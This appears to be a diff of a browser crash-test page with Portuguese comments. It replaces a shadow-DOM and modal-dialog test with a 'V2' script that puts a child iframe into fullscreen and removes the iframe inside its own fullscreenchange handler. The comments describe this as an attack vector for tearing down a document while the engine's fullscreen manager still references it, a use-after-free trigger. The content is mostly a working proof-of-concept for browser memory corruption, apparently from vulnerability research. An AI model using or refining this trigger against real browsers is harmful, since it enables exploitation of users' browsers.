@@ -1,33 +1,57 @@
-<!DOCTYPE html>
 <html>
 <body>
-<div id="host" style="display:none"></div>
-
-<!-- Adicionamos um elemento dialog real no DOM -->
-<dialog id="myDialog">
-    <iframe src="resources/self-closing-modal-dialog.html" style="border:none; width:100px; height:100px;"></iframe>
-</dialog>
-
+<button id="run">Run V2</button>
+<div id="status">Ready</div>
 <script>
-var host = document.getElementById('host');
-var sr = host.attachShadow({mode: 'open'});
-sr.innerHTML = '<picture id="pic"><source srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><img></picture>';
-var pic = sr.getElementById('pic');
+/*
+  VETOR: FullscreenManager call stack + Document teardown simultâneo
+  O evento fullscreenchange do iframe dispara → dentro do handler
+  removemos o iframe → Document do iframe inicia teardown enquanto
+  FullscreenManager ainda tem frames na call stack referenciando-o.
+*/
 
-pic.addEventListener('load', function listener() {
-    pic.removeEventListener('load', listener, true);   
-    pic.textContent =   '';   
-    
-    // Abre o dialog nativo corretamente usando a inst�ncia
-    var dialog = document.getElementById('myDialog');
-    if (dialog && typeof dialog.showModal === 'function') {
-        dialog.showModal();
-    }
+var iframe = null;
 
-    setTimeout(function() {
-        document.write('PASS if no crash.');
-    }, 0);
-}, /*capture*/ true);
+document.getElementById("run").onclick = function() {
+    iframe = document.createElement("iframe");
+    iframe.width = 200;
+    iframe.height = 200;
+    document.body.appendChild(iframe);
+
+    iframe.onload = function() {
+        var iDoc = iframe.contentDocument;
+        var iWin = iframe.contentWindow;
+
+        iDoc.open();
+        iDoc.write('<html><body><div style="width:100%;height:100%;background:green"></div></body></html>');
+        iDoc.close();
+
+        // Listener no documento FILHO
+        iDoc.addEventListener('webkitfullscreenchange', function() {
+            document.getElementById("status").innerHTML =
+                "CHILD fullscreenchange fired";
+
+            // Remove o iframe de DENTRO do callback fullscreen do filho
+            // FullscreenManager do filho está executando este callback
+            // enquanto o Document começa a ser destruído
+            if (iframe && iframe.parentNode) {
+                iframe.remove();
+                iframe = null;
+                document.getElementById("status").innerHTML +=
+                    " → iframe removed IN callback";
+            }
+        });
+
+        // Listener no documento PAI para detectar state pós-free
+        document.addEventListener('webkitfullscreenchange', function onFsChange() {
+            document.getElementById("status").innerHTML +=
+                " | PARENT fs=" + (document.webkitFullscreenElement ? "active" : "null");
+            document.removeEventListener('webkitfullscreenchange', onFsChange);
+        });
+
+        iDoc.documentElement.webkitRequestFullscreen();
+    };
+};
 </script>
 </body>
 </html>
